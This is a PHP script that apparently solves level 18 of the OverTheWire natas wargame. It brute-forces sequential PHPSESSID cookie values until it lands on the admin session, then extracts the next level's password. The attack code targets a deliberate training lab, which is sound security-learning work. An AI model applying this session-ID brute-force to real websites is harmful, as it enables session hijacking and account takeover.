<?php

require_once dirname(__DIR__) . '/bootstrap.php';

use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\setCookie;

$level = 18;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$sessionId = 0;

do {
    $sessionId++;
    print 'Trying sessionId ' . $sessionId . "\n";

    $jar = new CookieJar();
    $jar->setCookie(new SetCookie([
        'Name' => 'PHPSESSID',
        'Value' => $sessionId,
        'Domain' => 'natas18.natas.labs.overthewire.org',
        'Expires' => time() + 1000
    ]));

    $response = $client->request('POST', $url, [
        'auth' => [$username, $password],
        'form_params' => [
            'username' => 'john',
            'password' => 'nothing',
        ],
        'cookies' => $jar,
    ]);

    $body = (string)$response->getBody();

} while (preg_match('/You are logged in as a regular user/', $body));

preg_match('/Password: (.*)<\/pre>/', $body, $flag);
echo "\n";
echo $flag[1];
